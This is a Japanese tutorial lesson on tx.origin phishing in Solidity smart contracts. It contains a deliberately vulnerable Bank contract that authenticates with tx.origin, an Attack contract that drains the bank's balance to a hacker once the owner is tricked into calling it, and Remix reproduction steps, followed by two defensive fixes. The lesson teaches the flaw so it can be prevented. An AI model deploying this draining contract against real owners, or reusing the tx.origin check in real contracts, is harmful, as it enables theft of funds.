---
title: S12. tx.originフィッシング攻撃
tags:
  - solidity
  - security
  - tx.origin
---

# WTF Solidity 合約セキュリティ: S12. tx.originフィッシング攻撃

最近、Solidityを再学習し、詳細を固めるために「WTF Solidity 合約セキュリティ」を書いています。初心者向けのチュートリアル（プログラミング上級者は他のチュートリアルを参照してください）で、毎週1-3レッスンを更新します。

Twitter: [@0xAA_Science](https://twitter.com/0xAA_Science)｜[@WTFAcademy_](https://twitter.com/WTFAcademy_)

コミュニティ: [Discord](https://discord.gg/5akcruXrsk)｜[微信群](https://docs.google.com/forms/d/e/1FAIpQLSe4KGT8Sh6sJ7hedQRuIYirOoZK_85miz3dw7vA1-YjodgJ-A/viewform?usp=sf_link)｜[公式サイト wtf.academy](https://wtf.academy)

すべてのコードとチュートリアルはgithubで公開: [github.com/AmazingAng/WTF-Solidity](https://github.com/AmazingAng/WTF-Solidity)

---

このレッスンでは、スマートコントラクトの`tx.origin`フィッシング攻撃と予防方法を紹介します。

## `tx.origin`フィッシング攻撃

筆者が中学生の頃、ゲームを遊ぶのが特に好きでしたが、プロジェクト方が未成年者の依存を防ぐため、身分証番号で18歳以上であることを示すプレイヤーのみが依存防止制限を受けないルールを設けていました。どうすればよいでしょうか？後に筆者は親の身分証番号を使って年齢認証を行い、依存防止システムを迂回することに成功しました。この事例は`tx.origin`フィッシング攻撃と同工異曲の妙があります。

`solidity`では、`tx.origin`を使用してトランザクションを開始した元のアドレスを取得できます。これは`msg.sender`と非常に似ており、以下の例でそれらの違いを区別します。

ユーザーAがBコントラクトを呼び出し、さらにBコントラクトを通じてCコントラクトを呼び出した場合、Cコントラクトから見ると、`msg.sender`はBコントラクトで、`tx.origin`はユーザーAです。`call`の仕組みを理解していない場合は、[WTF Solidity極簡チュートリアル第22講：Call](https://github.com/AmazingAng/WTF-Solidity/blob/main/22_Call/readme.md)をお読みください。

![](./img/S12_1.jpg)

したがって、銀行コントラクトが`tx.origin`を使って身元認証を行っている場合、ハッカーは攻撃コントラクトをデプロイしてから銀行コントラクトのオーナーを誘導して呼び出すことができます。`msg.sender`は攻撃コントラクトアドレスですが、`tx.origin`は銀行コントラクトオーナーアドレスなので、転送が成功する可能性があります。

## 脆弱性コントラクトの例

### 銀行コントラクト

まず銀行コントラクトを見てみましょう。これは非常にシンプルで、コントラクトの所有者を記録する`owner`状態変数、コンストラクタと1つの`public`関数を含みます：

- コンストラクタ: コントラクト作成時に`owner`変数に値を代入します。
- `transfer()`: この関数は`_to`と`_amount`の2つのパラメータを受け取り、まず`tx.origin == owner`をチェックし、確認後に`_to`に`_amount`数量のETHを転送します。**注意：この関数はフィッシング攻撃のリスクがあります！**

```solidity
contract Bank {
    address public owner;//コントラクトの所有者を記録

    //コントラクト作成時にowner変数に値を代入
    constructor() payable {
        owner = msg.sender;
    }

    function transfer(address payable _to, uint _amount) public {
        //メッセージソースをチェック ！！！ ownerが誘導されてこの関数を呼び出す可能性があり、フィッシングリスクがある！
        require(tx.origin == owner, "Not owner");
        //ETHを転送
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
}
```

### 攻撃コントラクト

次に攻撃コントラクトです。その攻撃ロジックは非常にシンプルで、`attack()`関数を構築してフィッシングを行い、銀行コントラクトオーナーの残高をハッカーに転送します。`hacker`と`bank`の2つの状態変数があり、それぞれハッカーアドレスと攻撃対象の銀行コントラクトアドレスを記録します。

2つの関数を含みます：

- コンストラクタ: `bank`コントラクトアドレスを初期化します。
- `attack()`: 攻撃関数で、この関数は銀行コントラクトの`owner`アドレスによって呼び出される必要があります。`owner`が攻撃コントラクトを呼び出し、攻撃コントラクトが銀行コントラクトの`transfer()`関数を呼び出し、`tx.origin == owner`を確認後、銀行コントラクト内の残高をすべてハッカーアドレスに転送します。

```solidity
contract Attack {
    // 受益者アドレス
    address payable public hacker;
    // Bankコントラクトアドレス
    Bank bank;

    constructor(Bank _bank) {
        //address型の_bankを強制的にBank型に変換
        bank = Bank(_bank);
        //受益者アドレスをデプロイヤーアドレスに代入
        hacker = payable(msg.sender);
    }

    function attack() public {
        //bankコントラクトのownerを誘導して呼び出し、bankコントラクト内の残高をすべてハッカーアドレスに転送
        bank.transfer(hacker, address(bank).balance);
    }
}
```

## `Remix`での再現

**1.** まず`value`を10ETHに設定し、`Bank`コントラクトをデプロイします。オーナーアドレス`owner`がデプロイコントラクトアドレスに初期化されます。

![](./img/S12-2.jpg)

**2.** 別のウォレットにハッカーウォレットとして切り替え、攻撃対象の銀行コントラクトアドレスを入力し、`Attack`コントラクトをデプロイします。ハッカーアドレス`hacker`がデプロイコントラクトアドレスに初期化されます。

![](./img/S12-3.jpg)

**3.** `owner`アドレスに戻ります。この時、私たちは誘導されて`Attack`コントラクトの`attack()`関数を呼び出しました。`Bank`コントラクトの残高が空になり、同時にハッカーアドレスに10ETHが追加されたことが確認できます。

![](./img/S12-4.jpg)

## 予防方法

現在、`tx.origin`フィッシング攻撃を予防する主な方法は2つあります。

### 1. `msg.sender`を`tx.origin`の代わりに使用

`msg.sender`は現在のコントラクトを直接呼び出した呼び出し送信者アドレスを取得できます。`msg.sender`の検証により、呼び出しプロセス全体で外部攻撃コントラクトが現在のコントラクトを呼び出すことを回避できます。

```solidity
function transfer(address payable _to, uint256 _amount) public {
  require(msg.sender == owner, "Not owner");

  (bool sent, ) = _to.call{value: _amount}("");
  require(sent, "Failed to send Ether");
}
```

### 2. `tx.origin == msg.sender`の検証

`tx.origin`を使用する必要がある場合は、`tx.origin`が`msg.sender`と等しいかどうかを検証することもできます。これにより、呼び出しプロセス全体で外部攻撃コントラクトが現在のコントラクトを呼び出すことを回避できます。ただし、副作用として他のコントラクトがこの関数を呼び出せなくなります。

```solidity
    function transfer(address payable _to, uint _amount) public {
        require(tx.origin == owner, "Not owner");
        require(tx.origin == msg.sender, "can't call by external contract");
        (bool sent, ) = _to.call{value: _amount}("");
        require(sent, "Failed to send Ether");
    }
```

## まとめ

このレッスンでは、スマートコントラクトの`tx.origin`フィッシング攻撃を紹介しました。現在、2つの方法で予防できます：1つは`msg.sender`を`tx.origin`の代わりに使用すること、もう1つは同時に`tx.origin == msg.sender`を検証することです。前者の方法を使用することを推奨します。後者は他のコントラクトからのすべての呼び出しを拒否するためです。